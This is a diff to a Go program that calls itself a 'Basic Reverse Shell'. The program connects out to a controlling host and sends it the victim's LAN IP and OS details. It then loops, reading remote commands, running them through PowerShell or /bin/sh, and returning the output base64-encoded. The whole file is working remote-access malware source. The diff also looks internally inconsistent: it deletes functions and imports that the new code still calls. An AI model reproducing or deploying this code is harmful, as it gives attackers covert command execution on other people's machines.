@@ -2,14 +2,15 @@ package main
 
 import (
 	"bufio"
-	"encoding/base64"
 	"fmt"
 	"net"
+	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 )
 
-var HOST_IP string = "192.168.1.3"
+var HOST_IP string = GetOutboundIP() //"192.168.3.6"
 
 func main() {
 	connectPort := GetPort()
@@ -28,7 +29,26 @@ func GetPort() string {
 	}
 	defer getPort.Close()
 	// ip := GetOutboundIP()
-	it, err := getPort.Write([]byte("INFO:{clientType:Basic Reverse Shell,lanIP:" + GetOutboundIP() + ",isEncoded:false}\n"))
+	osFlavor := "n/a"
+	// TODO: add OS flavor
+	if runtime.GOOS == "linux" {
+		osFlavor = getOS()
+	} else if runtime.GOOS == "windows" {
+		cmd := exec.Command("wmic", "os", "get", "Caption")
+		out, _ := cmd.Output()
+		osFlavor = string(out)
+		osFlavor = osFlavor[strings.Index(osFlavor, "\n")+1:]
+		osFlavor = trim(osFlavor[:strings.Index(osFlavor, "\n")])
+		cmd.Run()
+	}
+	it, err := getPort.Write([]byte(
+		"INFO:{clientType:Basic Reverse Shell," +
+			"lanIP:" + GetOutboundIP() + "," +
+			"isEncoded:true" + "," +
+			"os:" + runtime.GOOS + "," +
+			"osFlavor:" + osFlavor +
+			"}\n",
+	))
 	if err != nil {
 		fmt.Println(err.Error())
 		fmt.Println(it)
@@ -36,56 +56,33 @@ func GetPort() string {
 	port, _ := bufio.NewReader(getPort).ReadString('\n')
 	return port
 }
-
-func GetOutboundIP() string {
-	//Dial a connection to a WAN IP to get the box's correct IP address.
-	//Note that this doesn't actually establish a connection,
-	//but simply pretends to setup one. This is enough to get us the IP
-	conn, err := net.Dial("udp", "8.8.8.8:80")
-	if err != nil {
-		return "none"
-	}
-	defer conn.Close()
-	localAddr := conn.LocalAddr().(*net.UDPAddr)
-	ip := localAddr.IP
-	ipstr := ip.String()
-	return ipstr
-}
-
 func EstablishConnection(port string) {
 	//Establish reverse connection to host
-	con, _ := net.Dial("tcp", HOST_IP+":"+port)
+	conn, _ := net.Dial("tcp", HOST_IP+":"+port)
 	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("powershell.exe")
-	} else {
-		cmd = exec.Command("/bin/sh")
-	}
-	//Set input/output to the established connection's in/out
-	cmd.Stdin = con
-	test := bufio.NewWriter(con)
-	out, _ := cmd.Output()
-	test.Write(out)
-	cmd.Stdout = con
-	cmd.Stderr = con
-	cmd.Run()
-}
+	reader := bufio.NewReader(conn)
+	for {
+		command, err := reader.ReadString('\n')
+		if err != nil {
+			return
+		}
+		args := strings.Split(command, " ")
+		if args[0] == "cd" {
+			os.Chdir(trim(command[3:]))
+			conn.Write([]byte("\n"))
+		} else {
+			if runtime.GOOS == "windows" {
+				cmd = exec.Command("powershell.exe", command)
+			} else {
+				cmd = exec.Command("/bin/sh", command)
+			}
+			out, _ := cmd.Output()
+			conn.Write([]byte(b64_encode(string(out)) + "\n"))
+			cmd.Run()
+		}
 
-/**
-Base 64 encode a message to be sent to the server
-*/
-func b64_encode(text string) string {
-	encoded := base64.StdEncoding.EncodeToString([]byte(text))
-	return encoded
-}
+		// fmt.Println(string(out))
 
-/**
-base 64 decode a message from the server
-*/
-func b64_decode(text string) string {
-	decoded, err := base64.StdEncoding.DecodeString(text)
-	if err != nil {
-		fmt.Println(err)
+		//Set input/output to the established connection's in/out
 	}
-	return string(decoded)
 }
